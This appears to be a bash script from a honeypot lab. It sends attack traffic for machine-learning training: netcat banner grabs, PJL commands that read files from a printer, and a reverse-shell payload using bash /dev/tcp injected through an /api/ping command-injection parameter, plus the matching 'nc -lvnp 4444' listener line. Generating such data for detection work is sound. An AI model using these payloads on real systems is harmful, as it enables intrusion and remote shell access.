#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 07_netcat.sh
# Demonstrates:
#   - Banner grab over raw TCP (SSH/FTP/Telnet/Printer PJL)
#   - PJL abuse against the printer (read filesystem via @PJL commands)
#   - Simulated reverse shell payload (delivered to a honeypot endpoint, NOT
#     an actual reverse shell — we just log the payload)
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
OUT="results/07_netcat"
mkdir -p results

echo "[+] Banner grab SSH..."
(echo ""; sleep 0.5) | nc -w 2 "${HOST}" "${SSH_PORT:-2222}" | head -c 80 | tee "${OUT}_ssh_banner.txt"

echo ""
echo "[+] Banner grab FTP..."
(echo ""; sleep 0.5) | nc -w 2 "${HOST}" "${FTP_PORT:-2121}" | head -c 80 | tee "${OUT}_ftp_banner.txt"

echo ""
echo "[+] Banner grab Telnet..."
(echo ""; sleep 0.5) | nc -w 2 "${HOST}" "${TELNET_PORT:-2323}" | head -c 120 | tee "${OUT}_telnet_banner.txt"

echo ""
echo "[+] PJL abuse against printer :9100 — read /etc/hostname..."
printf '@PJL FSDIRLIST NAME="0:/"\r\n@PJL FSUPLOAD NAME="0:/etc/hostname"\r\n' | \
  nc -w 2 "${HOST}" "${PRINTER_PJL_PORT:-9100}" | head -c 200 | tee "${OUT}_pjl.txt"

echo ""
echo "[+] Simulated reverse-shell payload via HTTP cmd injection..."
# This does NOT open a reverse shell. It sends a payload that *would* be a
# reverse shell in a real attack, through the HTTP /api/ping?host= cmd
# injection, so the honeypot logs the payload for ML training.
PAYLOAD='bash${IFS}-i${IFS}>&/dev/tcp/192.168.1.30/4444${IFS}0>&1'
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  --data-urlencode "host=127.0.0.1;${PAYLOAD}" \
  "http://${HOST}:${HTTP_PORT:-8080}/api/ping" | tee "${OUT}_revshell_sim.txt"

echo ""
echo "[+] Local netcat listener demo (would catch the reverse shell)..."
echo "(not actually starting a listener — for documentation only)"
echo "On a real attack the operator would run:  nc -lvnp 4444"

echo "[+] Done. Results in results/${OUT}_*"
